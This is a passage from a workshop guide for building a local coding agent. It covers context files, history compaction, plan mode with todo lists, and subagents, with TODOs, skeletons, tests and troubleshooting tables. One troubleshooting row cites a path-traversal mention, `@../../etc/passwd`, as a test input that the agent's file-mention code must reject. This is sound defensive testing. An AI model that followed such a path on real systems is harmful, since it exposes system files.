1. Reset first: `python scripts/tasks.py reset`. Start `forja --cwd playground`. The dim note `context: lab 06 pending ...` should NO LONGER appear.
2. Ask: `review @invoices/amounts.py and tell me whether it follows AGENTS.md`. Expected: NO `⏺ Read invoices/amounts.py` line (the file came with the message) and an answer that quotes the rules: half-up rounding with `decimal`, not `round()` on floats, don't change tests.
3. Ask without mentioning the rules: `what are the rules of this project?`. The agent answers from `AGENTS.md` without calling any tool.
4. Type `/context` before and after a message with a big `@` mention: the token count grows by roughly the file size / 4.
5. Optional: create `~/.forja/AGENTS.md` (Windows: `%USERPROFILE%\.forja\AGENTS.md`) with `Always answer in Spanish.`; restart Forja and say hello. The answer language changes: the global layer works.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_find_instruction_files_order` returns `['global', 'package', 'root']` | You did not reverse the walk (or reversed the global file too) → collect bottom-up, reverse only the chain, then prepend the global file. |
| `test_find_instruction_files_order` finds extra files or never stops (macOS) | Comparing resolved `cwd` with unresolved `stop` (`/var` vs `/private/var`) → resolve `stop` too. |
| `test_system_prompt_layers` fails on `half-up` in sp | The playground AGENTS.md was not included → call `find_instruction_files(ws.root, home=home)` and append the file CONTENT, not just its path. |
| `UnicodeDecodeError: 'charmap' codec can't decode` (Windows) | `read_text()` without encoding → `read_text(encoding="utf-8")` (and `errors="replace"` for mentioned files). |
| `test_expand_mentions`: `out.count("<file") == 2` or a crash on `@../../etc/passwd` | Missing `except PermissionError` or missing `is_file()` check → skip invalid mentions with `continue`. |
| In the CLI the agent still ignores AGENTS.md | You ran Forja from another folder, or the AGENTS.md is not under `--cwd` → start with `forja --cwd playground`; small models may also need the rule repeated in the prompt (less is more: keep AGENTS.md short). |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 06` → 3 passed.
- [ ] [ ] In the CLI the agent quotes `playground/AGENTS.md` rules (half-up, don't touch tests) without being told.
- [ ] [ ] An `@file` mention is answered without an extra `⏺ Read` line.

### Checkpoint
The agent quotes `playground/AGENTS.md` rules (half-up, don't touch tests) without being told.

### Challenges
1. Write your `~/.forja/AGENTS.md` with your preferences (language, style).
2. Add the Python version and last 3 commits to the environment.

**Tests:** `tests/test_l06_context.py` · **Fallen behind?** `python scripts/tasks.py catchup 07`


---

## Lab 07 · Context management and compaction

*Day 2 · 09:40–10:25*

**Goal:** Make a long session fit a local model's window without breaking history.

### Concepts
- **The budget:** local models work with 16–32k effective tokens. A verbose `pytest` or a large file eats the window.
- **Level 1 — microcompaction (free):** blank old tool outputs. The model already used them; it can re-read if needed.
- **Level 2 — compaction (1 call):** summarise old turns (goal, files, commands, decisions, pending) and keep recent ones.
- **Invariant:** cut only before a `user` message. Never between `tool_calls` and their `tool` results.
- **It's lossy:** measure it with evals (lab 12) using a small window.

### What you implement
| TODO | File | What |
|---|---|---|
| 07.1 | `forja/compaction.py` | microcompact: blank old outputs |
| 07.2 | `forja/compaction.py` | compact: summary + recent turns, pairs intact |

### Before you start
- Open `forja/compaction.py`. Provided: `SUMMARY_PROMPT`, `CLEARED = "[old tool result cleared]"`, `estimate_tokens(messages)` (~4 chars per token), `user_turn_starts(history)` (indices of the `user` messages) and `should_compact(...)` (true above 80% of the window). You write `microcompact` and `compact`.
- Know the history format (OpenAI chat): `{"role": "user", "content": ...}`, `{"role": "assistant", "content": ..., "tool_calls": [{"id", "type", "function": {"name", "arguments"}}]}`, `{"role": "tool", "tool_call_id": ..., "name": ..., "content": ...}`. An assistant message with `tool_calls` MUST be followed by one `tool` message per call: breaking that pair makes the API reject the request.
- A "turn" starts at a `user` message. Cutting only at `user_turn_starts(...)` indices is what guarantees you never separate a `tool_calls` message from its results.
- How it connects: `Forja.compact_now()` in `forja/harness.py` runs before every turn: if `should_compact` → `microcompact(self.history)` (free); if still too big → `compact(self.history, self.llm)` (one LLM call). `/compact` calls `compact_now(force=True)`. The LLM call is `llm.chat(messages, temperature=0)` and returns a `ChatResponse` whose `.content` is the text (in tests, `FakeLLM` records it in `llm.calls`).

### Step by step
07.1 first: it is a pure in-place loop, no LLM, and it teaches you the cut point (`starts[-keep_recent_turns]`) that 07.2 reuses. Then 07.2. `test_harness_autocompacts` (run with 07.2) exercises both through the harness with a tiny window, so it only passes when both are right.

#### TODO 07.1 · `forja/compaction.py` · `microcompact(history, keep_recent_turns=2, min_chars=500) -> int`

**What it must do:** Mutates `history` IN PLACE: every `tool` message located BEFORE the start of the last `keep_recent_turns` turns, whose content has at least `min_chars` characters and is not already `CLEARED`, gets `content = CLEARED`. Returns how many messages were cleared. If there are `keep_recent_turns` turns or fewer, does nothing and returns 0. Messages are never removed or reordered, so pairs stay valid. `test_microcompact` (4 turns, tool outputs of 2000 chars) expects 2 cleared (turns 0 and 1), the last two untouched, tokens below 60% of before, and a second call returning 0.

**Steps:**
1. Compute `starts = user_turn_starts(history)`; if `len(starts) <= keep_recent_turns`, return 0.
2. The protected zone starts at `limit = starts[-keep_recent_turns]`.
3. Loop over `history[:limit]` (the slice is a new list but holds the SAME dict objects, so mutating them changes `history`).
4. For each message with role `tool`, content length `>= min_chars` and content `!= CLEARED`: set it to `CLEARED` and count it.
5. Return the count.

**Watch out for:**
- Mutate the dicts; do not build a new list and return it. The function returns an `int` and the harness relies on `self.history` being changed in place.
- Only `tool` messages: never blank user or assistant content (that is the conversation itself).
- `content` may be `None`: use `len(m.get("content") or "")`.
- `>= min_chars`, not `>`: an output of exactly 500 characters counts.

<details><summary>💡 Hint 1</summary>

Find the index where the recent part begins; everything before it is fair game.

</details>

<details><summary>💡 Hint 2</summary>

`starts[-keep_recent_turns]` is the index of the first user message you want to keep intact.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
starts = user_turn_starts(history)
if len(starts) <= keep_recent_turns:
    return 0
limit = ...
n = 0
for m in history[:limit]:
    if m["role"] == "tool" and ...:   # long enough, not yet CLEARED
        ...
return n
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l07_compaction.py -k microcompact -v
```

#### TODO 07.2 · `forja/compaction.py` · `compact(history, llm, keep_recent_turns=2) -> tuple[list, bool]`

**What it must do:** If there are `keep_recent_turns` turns or fewer, return `(history, False)` without calling the LLM. Otherwise cut at `starts[-keep_recent_turns]`: `old = history[:cut]`, `recent = history[cut:]`. Turn `old` into plain text (one line per message: role and content; for assistants also the tools called with truncated arguments; for tool messages a truncated result), and call `llm.chat([{system: SUMMARY_PROMPT}, {user: that text}], temperature=0)`. Return `([{"role": "user", "content": "[Summary of the previous session]\n" + summary}, {"role": "assistant", "content": <short ack>}, *recent], True)`. `test_compact_keeps_pairs_and_recent` checks: the first message starts with `[Summary` and contains the fake summary; `new[2:] == h[8:]` (the last 2 turns untouched); pairs are valid; the text sent as `messages[1]` contains `question 0` but NOT `question 3` (recent turns are not summarised); `compact(history(1), llm)[1] is False`.

**Steps:**
1. Compute `starts`; return `(history, False)` early when there is not enough to compact.
2. Split into `old` and `recent` at `cut = starts[-keep_recent_turns]`.
3. Build a list of text lines from `old`: for `tool` messages something like `[result of <name>] <first 1500 chars>`; for others `<role>: <content>` plus `[tools: name(args…)]` taken from `m.get("tool_calls", [])` → `t["function"]["name"]` / `["arguments"]`.
4. Join the lines and cap the total (keep the END, e.g. the last 60,000 characters: the most recent old work matters most).
5. Call `llm.chat([...system SUMMARY_PROMPT..., ...user transcript...], temperature=0)` and take `.content or ""`.
6. Return the new history: summary as a `user` message, an `assistant` acknowledgement (e.g. `Understood. I'll continue from here.`), then `*recent`; and `True`.

**Watch out for:**
- The new history must start with `user` then `assistant`: two consecutive `user` messages (summary + next turn) or an orphan `tool` message break some chat templates. The ack fixes the alternation.
- Never summarise the recent turns: the test checks that `question 3` is not in the prompt sent to the model.
- Keep `recent` as-is (`new[2:] == h[8:]`): do not copy, clean or re-truncate those messages.
- `content` can be `None` (assistant messages with only tool calls): use `m.get("content") or ""` when formatting.
- The summary prompt goes as `messages[0]` with role `system` and the transcript as `messages[1]` with role `user`: the test reads `llm.calls[0]["messages"][1]["content"]`.

<details><summary>💡 Hint 1</summary>

Same cut point as 07.1, but instead of blanking you replace the whole old part with one summary.

</details>

<details><summary>💡 Hint 2</summary>

The LLM never sees the raw message dicts: you flatten them to text first, which is also where you truncate big tool results.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
starts = user_turn_starts(history)
if len(starts) <= keep_recent_turns:
    return history, False
cut = starts[-keep_recent_turns]
old, recent = history[:cut], history[cut:]
lines = []
for m in old:
    ...  # tool -> truncated result; others -> role: content [tools: ...]
summary = llm.chat([...], temperature=0).content or ""
return [ ...summary user msg..., ...assistant ack..., *recent ], True
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l07_compaction.py -k "keeps_pairs or autocompacts" -v
```

### Run
```bash
python scripts/tasks.py test 07
forja --cwd playground
> read every file in the project and summarise them
/context
/compact
/context
```

### Try it in your agent
1. `python scripts/tasks.py reset`, then `forja --cwd playground`. Ask: `read every file in the project and summarise them` (approve with `y` if asked; reads should not ask).
2. Type `/context`: something like `~6000 tokens of 32768 (N messages)`. Ask two more short questions (e.g. `which function computes VAT?`, `where is the due date logic?`) so you have at least 3 turns: compaction always keeps the last 2.
3. Type `/compact`. Expected: `compacted: summary + recent turns (~N tokens)`. If you only had 1–2 turns you get `nothing to compact` (or `microcompaction: N old outputs cleared`): that is correct behaviour.
4. Type `/context` again: the number drops clearly. Ask `what were we doing?`: the agent still knows the files and the goal (it reads them from the summary).
5. Optional: create `playground/.forja/settings.json` with `{"contextWindow": 6000}`, restart and work for a few turns: a dim note `· microcompaction: ...` or `· compacted: ...` appears automatically before a turn. Delete the file afterwards.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_microcompact`: `assert 4 == 2` (everything cleared) | You loop over the whole history → only `history[:starts[-keep_recent_turns]]`. |
| `test_microcompact`: second call returns 2 instead of 0, or the count is right but contents unchanged | Not checking `!= CLEARED`, or modifying a copy (`dict(m)`) → mutate the original dicts and skip already-cleared ones. |
| `test_compact_keeps_pairs_and_recent`: `question 3` found in the prompt | You summarise the whole history → only `old = history[:cut]`. |
| `test_compact_keeps_pairs_and_recent`: `KeyError: 'tool_calls'` or `TypeError: can only concatenate str (not "NoneType")` | Use `m.get("tool_calls", [])` and `m.get("content") or ""`. |
| `test_harness_autocompacts`: `assert any("compact" in n for n in app.notes)` fails | `compact` returns `(history, False)` too often, or 07.1 raises → check both functions with the 07.1 test first; the harness only adds the note when something was compacted. |
| Real model: after `/compact` the agent forgets which files it changed | Compaction is lossy → make sure your transcript text includes tool names and arguments (paths!), not just contents; measure it later with evals (lab 12). |
| Real model: `/compact` takes a long time | It is one full LLM call over up to 60k characters → normal on a laptop; a smaller cap on the transcript makes it faster. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 07` → 3 passed.
- [ ] [ ] `/context` drops after `/compact` and the agent still knows what it was doing.

### Checkpoint
`/context` drops after `/compact` and the agent still knows what it was doing.

### Challenges
1. Set `"contextWindow": 6000` in `.forja/settings.json` and work: when does it compact?
2. Compact with a smaller model than the main one.

**Tests:** `tests/test_l07_compaction.py` · **Fallen behind?** `python scripts/tasks.py catchup 08`


---

## Lab 08 · Plan before acting

*Day 2 · 10:25–11:10*

**Goal:** Visible task list and plan mode: the agent investigates, proposes and only executes once you approve.

### Concepts
- **todo_write:** the agent keeps its own list (pending / in_progress / completed). It forces decomposition and greatly improves small models' persistence on long tasks. One task in progress.
- **The list goes back into context** every turn (a system-prompt layer): the agent doesn't get lost.
- **Plan mode:** read-only via permissions, not via the model's goodwill. When it has a plan, it calls `exit_plan_mode`; if you approve, the harness switches to default mode.
- **When to use it:** multi-file changes, unfamiliar code, anything hard to undo.

### What you implement
| TODO | File | What |
|---|---|---|
| 08.1 | `forja/planning.py` | todo_write with validation |
| 08.2 | `forja/planning.py` | exit_plan_mode with user approval |

### Before you start
- Open `forja/planning.py`. Provided: `TodoItem` (pydantic model with `content: str` and `status: "pending" | "in_progress" | "completed"`, default `pending`), `ICON` and `TodoStore` with `.items` and `.render()` (one line `☐/▶/☑ content` per item, or `(empty list)`). You write the BODIES of two tools, inside factory functions.
- Both tools are created with `@tool(risk="read")` from lab 02: the docstring and type hints become the JSON schema the model reads, so do not change them. Raising an exception inside a tool is the right way to reject bad input: `ToolRegistry.execute` turns it into `ERROR in '<tool>': ValueError: <message>` and the model can correct itself.
- Arguments reach your function AFTER pydantic validation and `model_dump()`, so `todos` normally arrives as a list of plain dicts; but code may also call the function with `TodoItem` objects. Accept both (`TodoItem.model_validate(d)`).
- How it connects: `Forja._build_registry` registers `make_todo_tool(self.todos)` and `make_exit_plan_tool(self._approve_plan, lambda: self.set_mode("default"))`. The task list goes back into the system prompt every step via `extra` in `build_system_prompt` (lab 06). Plan mode is read-only because `permissions.decide` (lab 04) denies non-read tools in `plan`, not because the model behaves.

### Step by step
08.1 first (validation logic, fully unit-tested by `test_todo_write_validation`), then 08.2 (short). `test_plan_mode_flow`, selected with 08.2, drives a whole plan-mode turn through the harness and needs 08.1, 08.2, lab 04 (plan-mode deny) and lab 06 (the prompt layers) all working.

#### TODO 08.1 · `forja/planning.py` · `make_todo_tool(store)` → inner `todo_write(todos: list[TodoItem]) -> str`

**What it must do:** Replaces the WHOLE list in `store.items` with the given items, after validating: each item converted to `TodoItem`; more than one `in_progress` → `ValueError` (its message must contain `one task`, e.g. `only one task can be in_progress at a time`); an item with empty/blank `content` → `ValueError`. Validation happens BEFORE touching the store: on error the previous list stays. Returns `"List updated (X/N completed):\n" + store.render()` (X = completed, N = total). `test_todo_write_validation` expects `1/3` in the output, render lines `["☑ read", "▶ edit", "☐ tests"]`, and after the double-`in_progress` call: `ok` false, `one task` in the output and still 3 items in the store.

**Steps:**
1. Convert: `items = [t if isinstance(t, TodoItem) else TodoItem.model_validate(t) for t in todos]`.
2. Count items with `status == "in_progress"`; if more than 1, raise `ValueError` with a message the model can act on.
3. If any item has `not t.content.strip()`, raise `ValueError`.
4. Only now assign `store.items = items`.
5. Count completed items and return the header line plus `store.render()`.

**Watch out for:**
- Assign `store.items` only after all checks pass: the test checks that a rejected call leaves the old 3 items.
- The error text must contain `one task` (the test does `"one task" in two.output`).
- `content` of only spaces is also empty: use `.strip()`.
- Raise, do not return an error string: a returned string counts as success (`ok=True`) and the test expects `not two.ok`.
- Keep the factory shape: `todo_write` must stay an inner function that closes over `store` and is returned at the end.

<details><summary>💡 Hint 1</summary>

Three phases: normalise, validate, commit. Commit last.

</details>

<details><summary>💡 Hint 2</summary>

`sum(t.status == "in_progress" for t in items)` counts booleans.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
items = [...]               # dict or TodoItem -> TodoItem
if sum(...) > 1:
    raise ValueError("only one task can be in_progress at a time")
if any(...):                # blank content
    raise ValueError(...)
store.items = items
done = ...
return f"List updated ({done}/{len(items)} completed):\n{store.render()}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l08_planning.py -k todo_write -v
```

#### TODO 08.2 · `forja/planning.py` · `make_exit_plan_tool(approve, on_approved)` → inner `exit_plan_mode(plan: str) -> str`

**What it must do:** Empty/blank `plan` → `ValueError`. Otherwise call `approve(plan)` exactly once (in the CLI it shows the plan as Markdown and asks `Approve the plan and start? [y/N]`; headless or in tests it is a function returning `bool`). If approved: call `on_approved()` (the harness switches to `default` mode) and return a text containing `APPROVED` that tells the model it is no longer in plan mode and must implement the plan step by step and verify. If rejected: do NOT call `on_approved`, and return a text containing `REJECTED` saying it is still in plan mode and should ask what to change or propose an alternative. `test_exit_plan_tool` checks both branches and that the callback ran only on approval; `test_plan_mode_flow` checks that after approval `app.mode == "default"`.

**Steps:**
1. Validate `plan.strip()`; raise `ValueError` if empty.
2. Call `approve(plan)` once and keep the boolean.
3. If true: call `on_approved()`, then return the APPROVED instruction.
4. If false: return the REJECTED instruction.

**Watch out for:**
- The words `APPROVED` and `REJECTED` must be uppercase in the text: the tests look for them, and uppercase also helps small models notice the state change.
- Call `on_approved()` only in the approved branch, and only once.
- The return text is an instruction for the MODEL, not for the user: say clearly what to do next (implement + verify, or ask/propose). A vague `ok` makes small models re-plan forever.
- Do not change the mode yourself here: the tool does not know the harness; the `on_approved` callback does it.

<details><summary>💡 Hint 1</summary>

It is a guard clause plus an if/else around a callback.

</details>

<details><summary>💡 Hint 2</summary>

The two callbacks are injected so the tool is testable without a UI or a harness.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if not plan.strip():
    raise ValueError(...)
if approve(plan):
    ...                     # callback
    return "The user APPROVED the plan. ..."
return "The user REJECTED the plan. ..."
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l08_planning.py -k "exit_plan or plan_mode_flow" -v
```

### Run
```bash
python scripts/tasks.py test 08
forja --cwd playground --mode plan
> add percentage discounts to invoices (before VAT) with tests
/todos
```

### Try it in your agent
1. `python scripts/tasks.py reset`, then `forja --cwd playground --mode plan`. The prompt reads `plan ›`.
2. Ask: `add percentage discounts to invoices (before VAT) with tests`. Expected: only read actions (`⏺ Read ...`, `⏺ Grep ...`, `⏺ Glob ...`). If the model tries an edit you see a red `⎿ DENIED (plan mode: read-only) ...` and it goes back to investigating.
3. A magenta `Proposed plan` panel appears with files to touch, changes and how to verify, followed by `Approve the plan and start? [y/N] >`. Answer `n` once: the model gets `REJECTED` and asks what to change. Tell it what to adjust and approve with `y` the next time.
4. After `y`: the REPL mode becomes `default` (the next prompt shows `default ›`), edits now ask for approval, and you see `⏺ Todos (N)` lines as the agent ticks tasks off. Type `/todos` any time: `☑ ...`, `▶ ...`, `☐ ...`.
5. At the end the agent runs the tests; check yourself with `cd playground` and `python -m pytest -q`. Then `python scripts/tasks.py reset` to clean up.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_todo_write_validation`: `assert len(store.items) == 3` fails (it is 2) | You assigned `store.items` before validating → validate first, commit last. |
| `test_todo_write_validation`: `not two.ok` fails | You returned an error string instead of raising → `raise ValueError(...)`. |
| `AttributeError: 'dict' object has no attribute 'status'` | The registry passes dicts → convert with `TodoItem.model_validate(d)` (keep `TodoItem` instances as they are). |
| `test_plan_mode_flow`: `assert "PLAN mode" in llm.calls[0]["messages"][0]["content"]` fails | Lab 06 is not done, so the harness uses `FALLBACK_PROMPT` → finish 06.2 (or run `python scripts/tasks.py catchup 07`). |
| `test_plan_mode_flow`: the first tool result is not `DENIED` | Lab 04's `decide` does not deny non-read tools in plan mode → check TODO 04.x; the message must contain `plan mode`. |
| Real model never calls `exit_plan_mode` and just writes the plan as text | Small models do that → say it explicitly: `when you have the plan, present it with exit_plan_mode`; or try a stronger model. |
| Real model sets several tasks `in_progress` and loops on the error | Make the `ValueError` message actionable (`only one task can be in_progress at a time`); the model reads it and retries with one. |
| Headless (`forja -p ... --mode plan`) always rejects the plan | With no user, `plan_approver` is `None` → expected; plan mode is meant for interactive use. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 08` → 3 passed.
- [ ] [ ] In plan mode the agent investigates, presents a plan with `exit_plan_mode`, and after `y` executes it ticking off tasks (`/todos` shows progress).
- [ ] [ ] You saw at least one `DENIED (plan mode: read-only)` or one `REJECTED` and the agent recovered.

### Checkpoint
In plan mode the agent investigates, presents a plan and, once approved, executes it ticking off tasks.

### Challenges
1. On approval switch to `accept_edits` instead of `default`. When is that a good idea?
2. Show the task list live under each answer.

**Tests:** `tests/test_l08_planning.py` · **Fallen behind?** `python scripts/tasks.py catchup 09`


---

## Lab 09 · Subagents

*Day 2 · 11:25–12:10*

**Goal:** Delegate exploration and reviews to agents with their own context and restricted tools.

### Concepts
- **The problem:** exploring a repo costs 20 reads and 30k tokens that stay in the main agent's context forever.
- **The solution:** the `task` tool launches a subagent with a CLEAN context (system + prompt) that returns only its conclusion. The main agent pays ~300 tokens.
- **Same loop, other tools:** we reuse lab 03's `Agent` with a subset of tools and the SAME permission gate. A subagent can't spawn subagents.
- **Profiles in Markdown:** `.forja/agents/reviewer.md` with frontmatter (name, description, tools). The description is what the model reads to decide when to delegate.
- **The subagent prompt must be self-contained:** it doesn't see the conversation.

### What you implement
| TODO | File | What |
|---|---|---|
| 09.1 | `forja/subagents.py` | load_profiles: profiles from Markdown |
| 09.2 | `forja/subagents.py` | task: launch a subagent with a clean context |

### Before you start
- Open `forja/subagents.py` (your TODOs) and keep `forja/agent.py` (lab 03) and `forja/harness.py` (`_build_registry`) open next to it. The harness already calls `subagents.load_profiles(root / ".forja" / "agents")` and registers `subagents.make_task_tool(self.llm, reg, profiles, execute=self.gate, events_factory=self.sub_events)`: you only fill in the two functions.
- What you reuse: `Agent(llm, tools, execute=..., events=..., max_steps=...)` and its `run(messages) -> AgentResult` (fields `answer`, `stop_reason`, `steps`, `tool_calls`, `usage`). `ToolRegistry.subset(names)` builds a registry with only the names that exist (unknown names are silently skipped).
- Stdlib / libs used: `Path.glob("*.md")`, `Path.read_text(encoding="utf-8")`, the precompiled regex `FRONTMATTER` (group 1 = YAML between the `---` lines, group 2 = body) and `yaml.safe_load` (returns a dict, or `None` for empty YAML). `tools: read_file, grep` in YAML is a *string*; `tools: [read_file, grep]` is a *list*.
- Key idea: the subagent starts from a NEW `messages` list (system + user prompt). It never sees the main history; the main agent only gets back the string your `task` tool returns. Every subagent tool call still goes through `execute` = the harness gate (hooks, permissions, approvals, checkpoints).
- Look at `examples/project/.forja/agents/reviewer.md` for a real profile (it has `tools` and `max_steps`).

### Step by step
Do 09.1 first: it is pure parsing, has its own isolated test (`test_load_profiles`) and the harness needs it to build the list of subagents that appears in the `task` tool description. Then 09.2, whose tests (`test_task_isolated_context`, `test_unknown_subagent`) run through the full harness, so labs 02-04 must already pass.

#### TODO 09.1 · `forja/subagents.py` · `load_profiles(folder: Path) -> dict[str, AgentProfile]`

**What it must do:** Receives the agents folder (it may not exist). Returns a dict `name -> AgentProfile` that ALWAYS contains the built-in `explore` profile (start from a copy of `BUILTIN`, never mutate `BUILTIN` itself). For each `*.md` file with valid frontmatter that has both `name` and `description`, add `AgentProfile(name, description, system=<body stripped>, tools=<list[str]>, max_steps=<int, default 25>)`. Files without frontmatter or missing `name`/`description` are skipped silently. The test checks: `set(p) == {"explore", "reviewer"}`, `tools == ["read_file", "grep"]` (from the string `read_file, grep`), `max_steps == 5`, `system == "You are a reviewer."`, and that a missing folder returns exactly `BUILTIN`.

**Steps:**
1. Create `profiles = dict(BUILTIN)`; if the folder is not a directory, return it right away.
2. Loop over the `*.md` files in a stable order (`sorted`). Read each one as UTF-8 and apply `FRONTMATTER.match`.
3. No match → skip. Match → `yaml.safe_load(group 1)`, and treat `None` as `{}`.
4. Skip if `name` or `description` is missing or empty.
5. Normalise `tools`: default `["read_file", "grep", "glob"]`; if it is a string, split on commas and strip each item, dropping empties; if it is already a list, keep it.
6. Build the profile: the body (group 2) `.strip()`ped is the system prompt; `max_steps` via `int(...)` with default 25. Store it under its `name` (a file can override `explore` if it uses that name).

**Watch out for:**
- Returning `BUILTIN` itself and then adding to it mutates the module constant: the next test (`load_profiles(missing) == BUILTIN`) or the next harness instance will see stale profiles. Copy it.
- `tools: read_file, grep` is the string `'read_file, grep'`. Forgetting to split gives `['r','e','a',...]` if you iterate it, or a single unknown tool name — and `subset()` silently drops unknown names, so the subagent ends up with NO tools.
- `system` must be the body *without* the frontmatter and stripped: the test compares it exactly.
- `yaml.safe_load` on a frontmatter that only contains comments returns `None`: `.get` on it raises `AttributeError`.

<details><summary>💡 Hint 1</summary>

It is the same "frontmatter + body" parsing you will do again for skills in lab 10. The regex is already compiled for you.

</details>

<details><summary>💡 Hint 2</summary>

`m = FRONTMATTER.match(text)`; `meta = yaml.safe_load(m.group(1)) or {}`; `m.group(2).strip()` is the system prompt. `isinstance(tools, str)` tells you when to split.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
profiles = dict(BUILTIN)
if not folder.is_dir(): return profiles
for f in sorted(folder.glob("*.md")):
    m = ...            # FRONTMATTER.match on the file text
    if not m: continue
    meta = ...         # yaml, never None
    if <missing name or description>: continue
    tools = ...        # default list; split 'a, b' strings
    profiles[meta["name"]] = AgentProfile(...)
return profiles
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l09_subagents.py -k load_profiles -v
```

#### TODO 09.2 · `forja/subagents.py` · `make_task_tool(...)` → inner tool `task(description, prompt, subagent_type="explore") -> str`

**What it must do:** `make_task_tool` is already written except the body of `task`. Inside `task`: look up `profiles[subagent_type]`; if it does not exist raise `ValueError` whose message contains `unknown` and lists the available names (the registry turns it into a failed tool result; `test_unknown_subagent` checks `"unknown"` is in it). Build the subagent's registry with `parent_tools.subset(...)` using the profile's tools MINUS `"task"`. Create an `Agent` with the same `llm`, that sub-registry, `execute=execute`, `max_steps=prof.max_steps` and `events=events_factory(prof.name)` if a factory was given, else `Events()`. Run it on a BRAND-NEW list `[{"role": "system", "content": prof.system}, {"role": "user", "content": prompt}]`. Return a header that contains `subagent <name>` (the test looks for `"subagent explore"`), e.g. `[subagent explore · <description> · N steps · M tools · <stop_reason>]`, then a newline and `res.answer`. The test also checks that the subagent's first LLM call had exactly 2 messages starting with the explore system prompt, that it was offered exactly `{read_file, grep, glob}`, and that the main history only contains ONE tool message (`task`).

**Steps:**
1. Look up the profile; if missing, `raise ValueError(f"unknown subagent: ... Available: ...")`.
2. Compute the allowed tool names: the profile's `tools` without `"task"` (no recursion).
3. `sub_tools = parent_tools.subset(those names)`.
4. Pick the events object: `events_factory(prof.name)` when the factory is not `None`, otherwise `Events()`. In the CLI this factory prints the subagent's tool calls with the `[explore]` prefix.
5. Wrap `execute` in a small `sub_execute(call)`: if `call.name` is not in `sub_tools.tools`, return `ToolResult(call.id, call.name, False, "ERROR: tool '...' is not available to subagent '...'")`; otherwise delegate to `execute` (or `sub_tools.execute` when `execute` is `None`). The schema list only *offers* tools; the model can still call others.
6. Create the `Agent` (same `llm`, `execute=sub_execute`, `max_steps=prof.max_steps`) and call `run` with a NEW two-message list.
7. Format and return the header line + the subagent's `answer` (use `res.steps`, `res.tool_calls`, `res.stop_reason`).

**Watch out for:**
- Reusing or copying the parent's history: the subagent must start clean (`len(messages) == 2` on its first call).
- Passing `parent_tools` instead of the subset: the subagent would get `write_file`, `bash`, `task`… and `test_task_isolated_context` fails on the tool set.
- Forgetting to route through `execute`: the subagent would bypass the gate (no permissions, no hooks, no checkpoints).
- Trusting the offered tool list: `test_subagent_cannot_use_tools_outside_its_profile` makes the model call `write_file` from `explore`; your wrapper must refuse it and the file must not exist.
- The same `FakeLLM` serves main agent and subagent in call order: if your `task` makes an extra LLM call (or none), every scripted reply shifts and the assertions fail in confusing ways.
- Do not touch `task.description`: it is set after the function and includes the catalogue the model reads to choose a subagent.

<details><summary>💡 Hint 1</summary>

The whole subagent is just lab 03's `Agent` with a smaller registry and a fresh message list.

</details>

<details><summary>💡 Hint 2</summary>

`parent_tools.subset([t for t in prof.tools if t != "task"])`; `Agent(llm, sub_tools, execute=sub_execute, max_steps=..., events=...)`; `res = agent.run(messages)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
prof = profiles.get(subagent_type)
if prof is None: raise ValueError(...)  # 'unknown', list names
sub_tools = ...                 # subset, never 'task'
def sub_execute(call): ...     # refuse names not in sub_tools.tools
events = ...                    # factory(name) or Events()
agent = Agent(...)
res = agent.run([...])         # system + user ONLY
return f"[subagent {prof.name} · ...]\n{res.answer}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l09_subagents.py -k "task_isolated or unknown_subagent or outside_its_profile" -v
```

### Run
```bash
python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\project\.forja playground\.forja
forja --cwd playground
> use a subagent to find every place where amounts are rounded
> ask the reviewer subagent to review my uncommitted changes
```

### Try it in your agent
1. Copy the example project config into the playground. macOS/Linux: `cp -r examples/project/.forja playground/` · PowerShell: `Copy-Item -Recurse examples\project\.forja playground\.forja` · cmd: `xcopy /E /I examples\project\.forja playground\.forja`.
2. `forja --cwd playground`, then `/tools`: you should see `task [read]` at the end of the list, and no `subagents: lab 09 pending` note at startup.
3. Type `use a subagent to find every place where amounts are rounded`. Expected: `⏺ task …`, then indented lines `  [explore] ⏺ grep …` / `  [explore] ⏺ read_file …` (the subagent's calls; its text is not streamed), and finally the main agent's answer listing `path:line` locations.
4. Run `/context` before and after: the main context grows by a few hundred tokens, not by the size of every file the subagent read.
5. Edit something in `playground/invoices/` by hand, then: `ask the reviewer subagent to review my uncommitted changes`. You should see `  [reviewer] ⏺ bash git diff …` (allowed by `bash(git diff*)` in settings) and a review with numbered sections.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_task_isolated_context` fails with `StopIteration` / FakeLLM 'no more responses' | Your `task` calls the LLM a different number of times (e.g. you ran `agent.run` twice, or the main loop from lab 03 is broken) → one `Agent.run` per task call; run `tests/test_l03_agent.py` first. |
| Assertion on `{t['function']['name'] ...} == {'read_file','grep','glob'}` | You passed the whole parent registry, or included `task` → use `parent_tools.subset(...)` with `task` filtered out. |
| Subagent has no tools / answers without reading anything | In 09.1 `tools` was not split (string `'read_file, grep'`), so `subset()` dropped every name → split on commas and strip. |
| `reviewer` does not appear in the `task` description / 'unknown subagent: reviewer' | The profile file has no `---` frontmatter on the very first line, or lacks `description` → fix the file; profiles are read from `<project>/.forja/agents/`, so check you copied `.forja` into `playground/`. |
| No `[explore]` prefix in the CLI, subagent calls look like main calls | You ignored `events_factory` and always used `Events()` (then you see nothing) or passed the main events → use `events_factory(prof.name)` when it is not `None`. |
| The small model never delegates | 8B models often prefer doing it themselves → ask explicitly ('use a subagent…'); the `task` description is all it reads to decide. |
